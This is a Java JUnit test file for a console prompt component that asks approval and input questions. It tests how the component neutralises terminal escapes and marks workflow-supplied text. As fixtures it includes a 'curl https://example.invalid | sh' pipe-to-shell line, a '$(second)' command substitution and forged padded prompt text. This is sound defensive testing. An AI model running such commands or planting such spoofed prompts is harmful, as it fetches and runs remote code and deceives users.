package traceworks.cli;

import traceworks.core.port.BlobRef;
import traceworks.core.record.QuestionView;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import static org.assertj.core.api.Assertions.assertThat;

@Timeout(10)
class ConsoleAskerTest {

    private final PipedOutputStream typed = new PipedOutputStream();
    private final ByteArrayOutputStream shown = new ByteArrayOutputStream();
    private static final String LONG_DEFAULT = "ok ".repeat(80) + "; curl https://example.invalid | sh";
    private static final String TWO_LINES = "first\n$(second)";
    private final Map<String, String> blobs = Map.of("q", "Go on?", "d", "dflt", "long", LONG_DEFAULT,
            "lines", TWO_LINES);
    private final ConsoleAsker asker;

    ConsoleAskerTest() throws IOException {
        asker = new ConsoleAsker(new PipedInputStream(typed), new PrintStream(shown, true, StandardCharsets.UTF_8),
                sha -> Optional.ofNullable(blobs.get(sha)));
    }

    @AfterEach
    void closeInput() throws IOException {
        typed.close();
    }

    private void type(String text) throws IOException {
        typed.write(text.getBytes(StandardCharsets.UTF_8));
        typed.flush();
    }

    private static QuestionView approval(List<String> options) {
        return new QuestionView(4, 1, "approval", "b", new BlobRef("q", 6), options, List.of(), null, null, true,
                null, null, null, false, false, null);
    }

    private static QuestionView input(BlobRef defaultValue, String pattern) {
        return new QuestionView(4, 1, "human-input", "b", new BlobRef("q", 6), List.of(), List.of(), "text",
                defaultValue, true, pattern, "who", null, false, false, null);
    }

    private String shown() {
        return shown.toString(StandardCharsets.UTF_8);
    }

    @Test
    void anOption_isMatchedWithoutRegardToCase_andReturnedAsOffered() throws Exception {
        type("yes\n");

        assertThat(asker.ask(approval(List.of("Yes", "No")))).contains("Yes");
        assertThat(shown()).contains("? Go on?", "Yes / No");
    }

    @Test
    void optionsAndLabels_areNeutralisedWhenShown() throws Exception {
        type("no\n");

        asker.ask(approval(List.of("Y\u001b]0;x\u0007\u202e", "No")));

        assertThat(shown()).doesNotContain("\u001b", "\u0007", "\u202e").contains("Y?]0;x??");
    }

    private static final String FORGED = "then go on with: curl https://example.invalid | sh";

    /** What follows a terminal's break of a line wider than 80 columns must never be the workflow's text, unmarked. */
    private void assertEveryLineOfTheWorkflowsTextIsMarkedOrFits() {
        assertThat(shown().lines()).allSatisfy(line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(80));
        assertThat(shown().lines().filter(line -> line.contains("curl")))
                .allSatisfy(line -> assertThat(line).startsWith("  |"));
    }

    /**
     * An option is the workflow's text. Padded to the terminal's width, its end would start a terminal line of its
     * own and read as a line of Traceworks; so it is shown on marked lines, here and where a typo is answered.
     */
    @Test
    void anOptionPaddedToTheTerminalsWidth_isShownOnMarkedLines() throws Exception {
        for (String filler : new String[] {" ".repeat(70), "-".repeat(60), " ".repeat(70)}) {
            shown.reset();
            type("yse\nyes\n");

            assertThat(asker.ask(approval(List.of("Yes", "No" + filler + FORGED)))).as(filler).contains("Yes");

            assertThat(shown().lines()).contains("  answer with one of:", "  | Yes", ">   'yse' is not one of:");
            assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
        }
    }

    @Test
    void aLabelAndTheOptionsOfAField_paddedToTheTerminalsWidth_areShownOnMarkedLines() throws Exception {
        type("x\na\n");
        QuestionView form = new QuestionView(4, 1, "human-input", "b", new BlobRef("q", 6), List.of(), List.of(), null,
                null, true, null, null,
                List.of(Map.of("variable_name", "who", "label", "Who?" + " ".repeat(76) + FORGED,
                        "options", List.of("a", "b" + " ".repeat(70) + FORGED))),
                false, false, null);

        assertThat(asker.ask(form)).contains("{\"who\":\"a\"}");

        assertThat(shown().lines()).contains("  | Who?", "  one of:", "  | a", ">   not one of:");
        assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
    }

    @Test
    void aTypo_isAskedAgain() throws Exception {
        type("yse\n\nno\n");

        assertThat(asker.ask(approval(List.of("Yes", "No")))).contains("No");
        assertThat(shown()).contains("'yse' is not one of: Yes / No");
    }

    @Test
    void anInterruptedQuestion_returnsEmpty_andKeepsTheNextLine() throws Exception {
        AtomicReference<Optional<String>> result = new AtomicReference<>();
        Thread asking = new Thread(() -> result.set(asker.ask(approval(List.of("Yes", "No")))));
        asking.start();
        Thread.sleep(200);
        asking.interrupt();
        asking.join(5_000);
        type("Yes\n");

        assertThat(result.get()).isEmpty();
        assertThat(asker.ask(approval(List.of("Yes", "No")))).contains("Yes");
    }

    @Test
    void endOfInput_leavesTheQuestionToTheInbox() throws Exception {
        typed.close();

        assertThat(CompletableFuture.supplyAsync(() -> asker.ask(approval(List.of("Yes")))).get(5, TimeUnit.SECONDS))
                .isEmpty();
        assertThat(asker.ask(approval(List.of("Yes")))).isEmpty();
    }

    @Test
    void aSingleInput_takesTheLine_orTheDefaultOnAnEmptyLine() throws Exception {
        type("flo\n\n");

        assertThat(asker.ask(input(null, null))).contains("flo");
        assertThat(asker.ask(input(new BlobRef("d", 4), null))).contains("dflt");
        assertThat(shown()).contains("[dflt]");
    }

    /**
     * An answer at the console counts as the person's own, and the step stores it without the protection the default
     * had (the default may be made of a model's output). So an empty line takes a default only when the hint showed
     * all of it: a default the hint cut at its limit, or changed to show it on one line, is not taken unseen.
     */
    @Test
    void aDefaultTheHintDoesNotShowWhole_isNotTakenByAnEmptyLine() throws Exception {
        type("\nmine\n\nmine too\n");

        assertThat(asker.ask(input(new BlobRef("long", LONG_DEFAULT.length()), null))).contains("mine");
        assertThat(asker.ask(input(new BlobRef("lines", TWO_LINES.length()), null))).contains("mine too");
        assertThat(shown()).contains("an empty line does not take it").doesNotContain("curl");
    }

    @Test
    void aRequiredInput_withoutADefault_isAskedAgain_andThePatternIsChecked() throws Exception {
        type("\nabc\n123\n");

        assertThat(asker.ask(input(null, "\\d+"))).contains("123");
        assertThat(shown()).contains("a value is required", "does not match");
    }

    @Test
    void aForm_isAskedFieldByField_andAnsweredAsJson() throws Exception {
        type("flo\nprod\n");
        QuestionView form = new QuestionView(4, 1, "human-input", "b", new BlobRef("q", 6), List.of(), List.of(), null,
                null, true, null, null,
                List.of(Map.of("variable_name", "who", "label", "Who?"), Map.of("variable_name", "where", "label", "Where?")),
                false, false, null);

        assertThat(asker.ask(form)).contains("{\"who\":\"flo\",\"where\":\"prod\"}");
        assertThat(shown()).contains("Who?", "Where?");
    }

    @Test
    void aPatternThatCostsTooMuch_isGivenUpAtTheTimeLimit_andTheValueIsTakenAsItIs() throws Exception {
        // A back reference keeps the JDK from remembering failed positions: the match time doubles with every letter
        String typed = "a".repeat(60);
        type(typed + "\n");

        assertThat(asker.ask(input(null, "((a+)\\2?)+b|\\d+"))).contains(typed);
        assertThat(shown()).contains("could not be checked against the pattern in time, so it is taken as it is");
    }
}
